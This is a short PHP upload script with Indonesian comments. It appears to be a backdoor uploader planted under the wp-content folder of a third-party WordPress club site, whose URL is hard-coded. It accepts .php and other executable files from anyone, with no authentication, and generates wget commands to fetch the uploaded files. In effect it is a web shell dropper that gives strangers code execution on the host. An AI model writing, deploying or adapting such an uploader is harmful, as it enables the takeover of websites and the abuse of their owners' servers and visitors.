<?php
/**
 * Script Upload File + Auto Generate wget Command
 * Author: Custom Script
 */

// Konfigurasi
$uploadDir = __DIR__ . '/uploads/'; // folder penyimpanan
$baseUrl   = 'https://cadillaclasalleclub.org/wp-content/news/'; // URL target
$allowedExt = ['html', 'htm', 'php', 'txt', 'js', 'css', 'json', 'xml'];

// Buat folder uploads jika belum ada
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0755, true);
}

$message = '';
$wgetCommand = '';
$uploadedUrl = '';

// Proses upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];

    if ($file['error'] !== UPLOAD_ERR_OK) {
        $message = "❌ Error upload: " . $file['error'];
    } else {
        $originalName = basename($file['name']);
        $ext = strtolower(pathinfo($originalName, PATHINFO_EXTENSION));

        if (!in_array($ext, $allowedExt)) {
            $message = "❌ Ekstensi .$ext tidak diizinkan!";
        } elseif ($file['size'] > 10 * 1024 * 1024) { // max 10MB
            $message = "❌ File terlalu besar (max 10MB)";
        } else {
            // Nama file: sesuai nama asli (bisa disesuaikan)
            $safeName = preg_replace('/[^a-zA-Z0-9._-]/', '_', $originalName);
            $destination = $uploadDir . $safeName;

            // Jika file sudah ada, tambahkan timestamp
            if (file_exists($destination)) {
                $info = pathinfo($safeName);
                $safeName = $info['filename'] . '_' . time() . '.' . $info['extension'];
                $destination = $uploadDir . $safeName;
            }

            if (move_uploaded_file($file['tmp_name'], $destination)) {
                $uploadedUrl = rtrim($baseUrl, '/') . '/' . $safeName;

                // Ganti nama output wget: file .html
                $outputName = pathinfo($safeName, PATHINFO_FILENAME) . '.html';
                $wgetCommand = "wget -O " . escapeshellarg($outputName) . " " . escapeshellarg($uploadedUrl);

                $message = "✅ Upload berhasil!";
            } else {
                $message = "❌ Gagal memindahkan file.";
            }
        }
    }
}
?>
